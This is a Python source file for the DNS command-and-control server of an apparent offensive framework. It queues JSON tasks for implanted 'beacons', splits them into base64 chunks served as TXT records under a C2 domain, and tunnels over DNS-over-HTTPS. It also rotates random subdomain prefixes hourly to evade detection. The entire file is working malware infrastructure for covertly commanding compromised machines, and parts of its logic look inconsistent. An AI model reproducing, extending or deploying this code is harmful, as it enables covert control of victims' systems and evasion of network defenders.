import base64
import json
import random
import string
import threading
import time
from dnslib import DNSRecord, QTYPE, RR, TXT
from dnslib.server import DNSServer, DNSHandler, BaseResolver
import requests

from modules.config import load_config
from modules.logger import log_event

cfg = load_config().get("c2", {}).get("dns", {})
HOST = cfg.get("host", "0.0.0.0")
PORT = cfg.get("port", 5353)
DOMAIN = cfg.get("domain", "c2.example.com")
CHUNK = cfg.get("txt_chunk_size", 200)
USE_DOH = cfg.get("use_doh", True)
DOH_URL = cfg.get("doh_url", "https://cloudflare-dns.com/dns-query")  # example
ROTATE_INTERVAL = cfg.get("rotate_interval", 3600)  # seconds

# { beacon_id: [ { "task": <dict>, "chunks": [...], "sent_chunks": 0 }, ... ] }
TASKS = {}
LOCK = threading.Lock()

def _rotate_prefix():
    """
    Every ROTATE_INTERVAL seconds, pick a new random 4‐char prefix for task subdomains.
    """
    while True:
        new_pref = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
        cfg["domain"] = f"{new_pref}.{DOMAIN}"
        log_event("dns_c2_server", f"Rotated DNS domain to {cfg['domain']}".encode())
        time.sleep(ROTATE_INTERVAL)

class C2Resolver(BaseResolver):
    def resolve(self, request, handler):
        qname = request.q.qname
        qn = str(qname).rstrip(".")
        # Domain may be "abcd.c2.example.com"
        parts = qn.split(".")
        if len(parts) < 4 or ".".join(parts[-3:]) != DOMAIN:
            # Not our domain: drop
            return request.reply().send()
        bid = parts[0]
        with LOCK:
            if bid not in TASKS or not TASKS[bid]:
                reply = request.reply()
                reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, rclass=1, ttl=60, rdata=TXT("")))
                return reply
            entry = TASKS[bid][0]
            chunks = entry.get("chunks", [])
            idx = entry.get("sent_chunks", 0)
            if idx >= len(chunks):
                TASKS[bid].pop(0)
                reply = request.reply()
                reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, rclass=1, ttl=60, rdata=TXT("")))
                return reply
            txt = chunks[idx]
            entry["sent_chunks"] += 1
        reply = request.reply()
        reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, rclass=1, ttl=60, rdata=TXT(txt)))
        return reply

def add_task(bid: str, task: dict):
    payload = json.dumps(task).encode()
    b64 = base64.b64encode(payload).decode()
    chunks = [b64[i:i+CHUNK] for i in range(0, len(b64), CHUNK)]
    with LOCK:
        TASKS.setdefault(bid, []).append({"task": task, "chunks": chunks, "sent_chunks": 0})
    log_event("dns_c2_server", f"Added DNS task for {bid}: {task}".encode())

def doh_query(subdomain: str):
    """
    Perform a DoH lookup for TXT records of <subdomain>.<DOMAIN>.
    """
    dns_query = base64.urlsafe_b64encode(DNSRecord.question(subdomain + "." + DOMAIN, "TXT").pack()).decode()
    headers = {"Accept": "application/dns-message"}
    r = requests.get(f"{DOH_URL}?dns={dns_query}", headers=headers, timeout=10)
    return DNSRecord.parse(r.content)

def doh_loop():
    """
    If USE_DOH is true, poll DoH every 30 seconds for any queued tasks for active beacons.
    """
    while True:
        time.sleep(30)
        with LOCK:
            for bid in list(TASKS.keys()):
                sub = f"{bid}"
                try:
                    resp = doh_query(sub)
                    for rr in resp.rr:
                        if rr.rtype == QTYPE.TXT:
                            txts = rr.rdata.strings
                            # Concatenate chunks and decode
                            data = b"".join(txts)
                            try:
                                task_json = base64.b64decode(data)
                                task = json.loads(task_json.decode())
                                log_event("dns_c2_server", f"DoH received task for {bid}: {task}".encode())
                                # Handle task immediately (e.g., write to HTTP queue or direct WS)
                                # For now, just log and remove from TASKS
                                TASKS[bid].pop(0)
                            except:
                                pass
                except Exception as e:
                    log_event("dns_c2_server", f"DoH lookup error {e}".encode())

if __name__ == "__main__":
    resolver = C2Resolver()
    server = DNSServer(resolver, port=PORT, address=HOST, tcp=True)
    log_event("dns_c2_server", f"Starting DNS C2 on {HOST}:{PORT}".encode())
    server.start_thread()

    if USE_DOH:
        t = threading.Thread(target=doh_loop, daemon=True)
        t.start()

    # Domain rotation thread
    rot = threading.Thread(target=_rotate_prefix, daemon=True)
    rot.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
